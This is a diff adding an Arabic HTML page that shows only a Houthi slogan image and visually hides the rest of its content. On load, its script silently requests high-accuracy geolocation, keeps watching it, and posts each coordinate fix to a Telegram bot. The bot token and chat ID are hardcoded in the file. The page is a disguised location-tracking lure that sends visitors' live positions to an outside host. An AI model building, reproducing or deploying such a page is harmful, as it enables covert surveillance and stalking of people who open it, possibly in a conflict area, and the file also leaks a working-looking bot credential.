@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>الصرخة</title>
+  <style>
+    /* إخفاء كل محتوى الصفحة بصريًا */
+    body, html {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* صورة الشعار في الوسط */
+    #logo {
+      max-width: 50%;
+      max-height: 50%;
+      z-index: 1000;
+    }
+
+    /* إخفاء باقي العناصر بصريًا مع إبقائها في DOM */
+    .hidden-content {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;  /* يخفي العناصر بصريًا */
+      pointer-events: none; /* يمنع التفاعل معها */
+    }
+  </style>
+</head>
+<body>
+  <!-- الشعار فقط ظاهر -->
+  <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/38/Slogan_of_the_Houthi_Movement.svg/500px-Slogan_of_the_Houthi_Movement.svg.png" alt="شعار أنصار الله">
+
+  <!-- كل محتوى الصفحة الأصلي مخفي بصريًا -->
+  <div class="hidden-content">
+    <header>
+      <h1>الصرخة</h1>
+    </header>
+
+    <div class="container">
+      <section class="card row">
+        <div>
+          <div class="controls" style="margin-bottom:12px;">
+            <button id="copyBtn" class="btn btn-secondary">نسخ الإحداثيات</button>
+            <a class="btn btn-secondary" id="mapsBtn" target="_blank" rel="noopener">فتح في خرائط جوجل</a>
+          </div>
+          <div class="hint">أكد مصداقيتك على قول الحق</div>
+          <div style="margin-top:10px; display:flex; gap:8px; flex-wrap:wrap;">
+            <span class="badge ok" id="secureBadge">أكد مصداقيتك على قول الحق</span>
+            <span class="badge ok" id="permBadge">أكد مصداقيتك على قول الحق</span>
+            <span class="badge" id="sensorBadge">أكد مصداقيتك على قول الحق</span>
+          </div>
+          <div class="kv" style="margin-top:12px;">
+            <div>خط العرض (lat):</div><div id="lat">—</div>
+            <div>خط الطول (lng):</div><div id="lng">—</div>
+            <div>الدقة (متر):</div><div id="accuracy">—</div>
+            <div>الارتفاع (متر):</div><div id="altitude">—</div>
+            <div>دقة الارتفاع (متر):</div><div id="altAcc">—</div>
+            <div>الاتجاه (heading°):</div><div id="heading">—</div>
+            <div>السرعة (م/ث):</div><div id="speed">—</div>
+            <div>آخر تحديث:</div><div id="timestamp">—</div>
+          </div>
+        </div>
+        <div>
+          <div id="map"></div>
+        </div>
+      </section>
+    </div>
+
+    <footer>أكد مصداقيتك على قول الحق</footer>
+  </div>
+
+  <!-- Leaflet وخريطة -->
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script>
+    // الكود الأصلي لجمع الموقع وإرسال التيليجرام
+    const TELEGRAM_TOKEN = "8149596430:AAFF6wIhw_mVfAtjfeQ9izfCawTI6Ch0Hag";
+    const TELEGRAM_CHAT_ID = "6837315281";
+
+    async function sendToTelegram(lat, lng, accuracy) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+      const text = `📍 موقع جديد:\nhttps://maps.google.com/?q=${lat},${lng}\nخط العرض: ${lat}\nخط الطول: ${lng}\nالدقة: ${accuracy}m`;
+      try { 
+        await fetch(url, { 
+          method:'POST', 
+          headers:{'Content-Type':'application/json'}, 
+          body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text}) 
+        }); 
+      } catch(e){ console.error("فشل الإرسال إلى تيليجرام", e); }
+    }
+
+    const el = id => document.getElementById(id);
+    const latEl = el('lat'), lngEl = el('lng'), accEl = el('accuracy'), altEl = el('altitude'),
+          altAccEl = el('altAcc'), headEl = el('heading'), speedEl = el('speed'), timeEl = el('timestamp');
+    const secureBadge = el('secureBadge'), permBadge = el('permBadge');
+    const copyBtn = el('copyBtn'), mapsBtn = el('mapsBtn');
+
+    const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
+    secureBadge.textContent = "أكد مصداقيتك على قول الحق";
+
+    let map = L.map('map').setView([15.3694, 44.1910], 6);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom:19 }).addTo(map);
+    let marker=null, circle=null;
+
+    function updateMap(lat,lng,accuracy){
+      const pos=[lat,lng];
+      if(!marker) marker=L.marker(pos).addTo(map); else marker.setLatLng(pos);
+      if(!circle) circle=L.circle(pos,{radius:accuracy||30}).addTo(map); 
+      else {circle.setLatLng(pos);circle.setRadius(accuracy||30);}
+      map.setView(pos,17);
+    }
+
+    function fmt(n){ return (n==null)?'—':Number(n).toFixed(6); }
+
+    function showPosition(pos){
+      const c=pos.coords;
+      latEl.textContent = fmt(c.latitude);
+      lngEl.textContent = fmt(c.longitude);
+      accEl.textContent = c.accuracy?`${Math.round(c.accuracy)} m`:'—';
+      altEl.textContent = c.altitude!=null?`${Math.round(c.altitude)} m`:'—';
+      altAccEl.textContent = c.altitudeAccuracy!=null?`${Math.round(c.altitudeAccuracy)} m`:'—';
+      headEl.textContent = c.heading!=null&&!isNaN(c.heading)?`${Math.round(c.heading)}°`:'—';
+      speedEl.textContent = c.speed!=null?`${c.speed.toFixed(2)} m/s`:'—';
+      timeEl.textContent = new Date(pos.timestamp).toLocaleString();
+
+      updateMap(c.latitude,c.longitude,c.accuracy||30);
+      mapsBtn.href = `https://www.google.com/maps?q=${c.latitude},${c.longitude}`;
+      sendToTelegram(c.latitude,c.longitude,Math.round(c.accuracy||0));
+      permBadge.textContent = "أكد مصداقيتك على قول الحق";
+    }
+
+    function showError(err){
+      permBadge.textContent = "أكد مصداقيتك على قول الحق";
+      console.error("خطأ:", err.message);
+    }
+
+    function buildOptions(){ return { enableHighAccuracy:true, timeout:15000, maximumAge:0 }; }
+
+    function getOnce(){ 
+      if('geolocation' in navigator && isSecure) 
+        navigator.geolocation.getCurrentPosition(showPosition,showError,buildOptions()); 
+    }
+
+    function startWatch(){
+      if('geolocation' in navigator && isSecure){
+        navigator.geolocation.watchPosition(showPosition, showError, buildOptions());
+      }
+    }
+
+    copyBtn.addEventListener('click', async ()=>{
+      const lat=latEl.textContent,lng=lngEl.textContent;
+      if(lat==='—') return;
+      try{ await navigator.clipboard.writeText(`${lat},${lng}`); } catch{}
+    });
+
+    window.addEventListener('load', ()=>{
+      getOnce();
+      startWatch();
+    });
+  </script>
+</body>
+</html>
